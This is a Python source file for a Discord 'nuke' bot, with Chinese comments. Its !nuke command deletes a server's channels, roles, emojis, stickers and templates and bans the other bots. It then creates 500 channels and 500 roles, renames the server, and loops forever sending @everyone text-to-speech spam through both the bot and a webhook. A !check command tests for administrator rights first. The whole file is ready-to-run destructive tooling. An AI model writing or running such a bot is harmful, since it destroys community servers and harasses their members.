from discord.ext import commands
import discord
import asyncio

#設定settings
prefix = "!"
channel_name = "nuked"
role_name = "nuked"
server_name = "Nuked Server"
webhook_name = "Nuke bot"
message = "boom"
token = "your discord bot token"


bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())

@bot.event 
async def on_ready():
    print("Bot ready.")

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    tasks = []
    
    tasks.extend([member.ban(reason="Nuked") for member in ctx.guild.members if member.bot and member != ctx.guild.me])
    tasks.extend([role.delete() for role in ctx.guild.roles if role != ctx.guild.default_role and role != ctx.guild.me.top_role])
    tasks.extend([emoji.delete() for emoji in ctx.guild.emojis])
    tasks.extend([sticker.delete() for sticker in ctx.guild.stickers])
    
    if ctx.guild.templates:
        templates = await ctx.guild.templates()
        tasks.extend([template.delete() for template in templates])
    
    tasks.extend([channel.delete() for channel in ctx.guild.channels])
    
    try:
        await asyncio.gather(*tasks)
    except Exception:
        pass
    
    create_tasks = []
    for _ in range(500):
        create_tasks.append(ctx.guild.create_text_channel(channel_name))
        create_tasks.append(ctx.guild.create_role(name=role_name))
    await asyncio.gather(*create_tasks)

@bot.command() 
async def check(ctx):
    guild = ctx.guild
    
    if guild:
        bot_member = guild.me
        if bot_member.guild_permissions.administrator:
            await ctx.send("有管理者權限")
        else:
            await ctx.send("沒有管理者權限")
    else:
        await ctx.send("這個命令僅在伺服器中有效")

@bot.event
async def on_guild_channel_create(channel):
    if channel.name == channel_name:
        try:
            await channel.guild.edit(name=server_name)
            webhook = await channel.create_webhook(name=webhook_name)
            
            while True:
                # 批量發送消息
                tasks = []
                for _ in range(10):  # 每次發送10條消息
                    tasks.append(channel.send(f"@everyone @here\n{message}", tts=True))
                    tasks.append(webhook.send(f"@everyone @here\n{message}", tts=True))
                await asyncio.gather(*tasks)
                
        except discord.errors.Forbidden:
            pass

bot.run(token)